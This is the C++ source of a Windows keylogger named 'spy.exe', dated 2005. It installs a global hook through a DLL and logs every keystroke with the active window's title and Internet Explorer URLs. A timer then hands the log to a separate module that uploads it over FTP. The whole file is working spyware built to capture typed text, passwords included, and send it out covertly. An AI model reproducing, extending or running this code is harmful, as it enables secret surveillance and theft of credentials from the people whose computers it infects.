// Written by Dor Alon 2005

#include "stdafx.h"
#include <stdio.h>
#include "resource.h"
#include "consts.h"

typedef LRESULT (CALLBACK *HookProc)( int nCode, WPARAM wParam, LPARAM lParam);
typedef void (WINAPI *SetSpyHwnd)(DWORD);
typedef DWORD (WINAPI *GetCommHwnd)();

HMODULE g_hHookDll =    NULL;
HHOOK   g_hHook =       NULL;
HWND    g_hWinInFocus = NULL;
HWND	g_hLastWin =    NULL;
bool	g_isUploading = false;
char    g_sSpyLogFileName[1024];
char    g_sSpyLogFileName2[1024];


/////////////////////////////////////////////////////////////////////////////////////////////

bool InstallHook(HWND hwnd)
{
	SetSpyHwnd SetHwndFunc;
	HookProc HookProcFunc;
	
	if (g_hHookDll = LoadLibrary(SPY_DLL_NAME))
	{
		if (SetHwndFunc = (SetSpyHwnd) ::GetProcAddress (g_hHookDll,"SetSpyHwnd"))
		{
			//Store Main Module HWND in to the shared memory
			(SetHwndFunc)((DWORD)hwnd);
			
			if (HookProcFunc = (HookProc) ::GetProcAddress (g_hHookDll,"HookProc"))
			{
				if (g_hHook = SetWindowsHookEx(WH_CBT, HookProcFunc, g_hHookDll, 0))
					return true;
			}
		}
	}
	
	return false;
}

/////////////////////////////////////////////////////////////////////////////////////////////

VOID CALLBACK TimerProc(HWND hwnd, UINT uMsg, unsigned int idEvent, DWORD dwTime)
{
	DWORD fileSizeHigh, fileSizeLow;
	HWND hCommWin;

	if (g_isUploading) return;

	fileSizeLow = GetCompressedFileSize(g_sSpyLogFileName, &fileSizeHigh);
	
	if (fileSizeLow > MAX_SIZE_OF_LOG)
	{	  
		if (hCommWin = ::FindWindow(COMM_WIN_CLASS, ""))
		{
 			::MoveFile(g_sSpyLogFileName, g_sSpyLogFileName2);
			::PostMessage(hCommWin, MSG_WM_UPLOAD_FILE, 0, 0);
			g_isUploading = true;		
		}
	}	
}

///////////////////////////////////////////////////////////////////////////////////////////

void WriteToLog(char ch)
{
	char str[2];
	str[0] = ch;
	str[1] = NULL;

	FILE* fout = fopen(g_sSpyLogFileName, "a+");
	
	if (fout)
	{
		fwrite(str, 1, 1, fout);
		fclose(fout);
	}
}

///////////////////////////////////////////////////////////////////////////////////////////

void WriteToLog(char *text)
{
	FILE* fout = fopen(g_sSpyLogFileName, "a+");
	
	if (fout)
	{
		fwrite(text, 1, strlen(text), fout);
		fclose(fout);
	}
}

///////////////////////////////////////////////////////////////////////////////////////////

BOOL CALLBACK EnumIEControls(HWND hwnd, LPARAM lParam)
{
	char szClassName[255];
	::GetClassName(hwnd, szClassName, 255);

	if (strcmp(szClassName, "Edit") == 0)
	{
		::SendMessage(hwnd, WM_GETTEXT, 255, lParam);
		return FALSE;
	}
	return TRUE;
}

///////////////////////////////////////////////////////////////////////////////////////////

void WriteNewAppHeader(HWND hwnd)
{
	HWND hTopLevelWin;
	HWND hTemp = hwnd;

	//Retrieve top level window handle
	while(hTemp = ::GetParent(hTemp))
	{	
		hTopLevelWin = hTemp;
	}

	//Retrieve top level window caption
	char szWinTitle[255];
	::SendMessage(hTopLevelWin, WM_GETTEXT, 255, (LPARAM)szWinTitle);
	
	//Write to log 
	char szHeader[255];
	sprintf(szHeader, "\nWin Caption = %s\n", szWinTitle); 
	WriteToLog(szHeader);

	//If this window is IE retrieve URL as well
	if (strstr(szWinTitle, "Internet Explorer"))
	{
		char url[255];
		url[0] = NULL;
		::EnumChildWindows(hTopLevelWin, EnumIEControls, (LPARAM)url);
		if (strlen(url))
		{
			sprintf(szHeader, "url = %s\n", url); 
			WriteToLog(szHeader);
		}
	}
}

/////////////////////////////////////////////////////////////////////////////

LRESULT OnInterceptKeyStroke(WPARAM wParam, LPARAM lParam) 
{
	//If we are logging a new application we should print an appropriate header 
	if (g_hWinInFocus != g_hLastWin)
	{
		WriteNewAppHeader(g_hWinInFocus);  
		g_hLastWin = g_hWinInFocus;
    }
	
	if (wParam==VK_RETURN || wParam==VK_TAB)
	{
		WriteToLog('\n');
	}
	else
	{
		BYTE keyStateArr[256];
		WORD word;
		UINT scanCode = lParam;
        char ch;

		//Translate virtual key code to ascii
		GetKeyboardState(keyStateArr);
		ToAscii(wParam, scanCode, keyStateArr, &word, 0);
		ch = (char) word;
		
		if ((GetKeyState(VK_SHIFT) & 0x8000) && wParam >= 'a' && wParam <= 'z')
			ch += 'A'-'a';

		WriteToLog(ch); 

	}
	return 0;
}

/////////////////////////////////////////////////////////////////////////////

LRESULT OnSetKeyboardFocus(WPARAM wParam, LPARAM lParam) 
{
	g_hWinInFocus = (HWND)wParam;
	
	return S_OK;
}

/////////////////////////////////////////////////////////////////////////////

LRESULT OnFileUploaded(WPARAM wParam, LPARAM lParam) 
{
	//Log file was uploaded succesfully
	if (wParam)
	{
		DeleteFile(g_sSpyLogFileName2);
	}
	else
	{
		char temp[255];
		FILE* f1=fopen(g_sSpyLogFileName,"rt");
		FILE* f2=fopen(g_sSpyLogFileName2,"at");
		
		while (!feof(f1))
		{
			if (fgets(temp, 255, f1))
			{
				fputs(temp, f2);
			}
		}
		
		fclose(f1);
		fclose(f2);
		
		MoveFile(g_sSpyLogFileName2, g_sSpyLogFileName);
	}
	
	g_isUploading = false;
	return S_OK;
}

/////////////////////////////////////////////////////////////////////////////////////////////
//
//  FUNCTION: WndProc(HWND, unsigned, WORD, LONG)
//
//  PURPOSE:  Processes messages for the main window.
//
//  MSG_MY_WM_KEYDOWN	- Process an application keystroke
//  MSG_MY_WM_SETFOCUS	- Process an application keystroke
//  MSG_WM_UPLOAD_FILE	- Process an FTP Module notification
//  WM_DESTROY	- post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (message == MSG_MY_WM_KEYDOWN)
		return OnInterceptKeyStroke(wParam, lParam);

	if (message == MSG_MY_WM_SETFOCUS)
		return OnSetKeyboardFocus(wParam, lParam);

	if (message == MSG_WM_UPLOAD_FILE)
		return OnFileUploaded(wParam, lParam);
     
	switch (message)
	{	
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
		
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

/////////////////////////////////////////////////////////////////////////////////////////////

ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX); 

	wcex.style			= 0;
	wcex.lpfnWndProc	= (WNDPROC)WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= NULL;
	wcex.hCursor		= NULL;
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName	= SPY_WIN_CLASS;
	wcex.hIconSm		= NULL;

	return RegisterClassEx(&wcex);
}

/////////////////////////////////////////////////////////////////////////////////////////////

void InitGlobals()
{
	g_hWinInFocus = NULL;
	g_hLastWin = NULL;
	g_isUploading = false;

	//Retrive full path of spy.exe
	::GetModuleFileName(GetModuleHandle(NULL), g_sSpyLogFileName, 1024);

	//Trim "spy.exe"
	while (g_sSpyLogFileName && g_sSpyLogFileName[strlen(g_sSpyLogFileName)-1] != '\\')
		g_sSpyLogFileName[strlen(g_sSpyLogFileName)-1] = NULL;

	strcpy(g_sSpyLogFileName2, g_sSpyLogFileName);

	//spy.exe path + log file name = full path of log file
	strcat(g_sSpyLogFileName, LOG_FILE);   
	strcat(g_sSpyLogFileName2, LOG_FILE2);
}

/////////////////////////////////////////////////////////////////////////////////////////////

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR     lpCmdLine,
					 int       nCmdShow)
{
	MSG msg;
	HWND hWnd;

	InitGlobals();

	if (!MyRegisterClass(hInstance))
		return FALSE;

	if (!(hWnd = CreateWindow(SPY_WIN_CLASS, "", WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, hInstance, NULL)))
		return FALSE;

	if (!InstallHook(hWnd)) 
		return FALSE;

	::SetTimer(hWnd, 0, CHECK_LOG_SIZE_TIME, TimerProc);

	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0)) 
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.wParam;
}



